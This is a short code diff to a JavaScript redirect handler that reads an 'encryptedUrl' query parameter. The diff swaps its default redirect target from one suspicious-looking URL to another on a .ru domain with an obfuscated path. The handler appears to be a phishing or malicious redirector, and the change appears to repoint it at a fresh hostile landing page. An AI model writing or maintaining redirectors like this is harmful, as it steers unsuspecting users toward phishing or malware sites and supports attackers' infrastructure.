@@ -3,7 +3,7 @@ module.exports = (req, res) => {
     const encryptedUrl = req.query.url;
 
     // Default link to redirect to (in case no URL is provided)
-    const defaultUrl = 'https://boot.paivucea.sa.com/eNbW@CP5/';
+    const defaultUrl = 'https://kofeastou.ru/1ghxst@0abGUICyxb/';
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
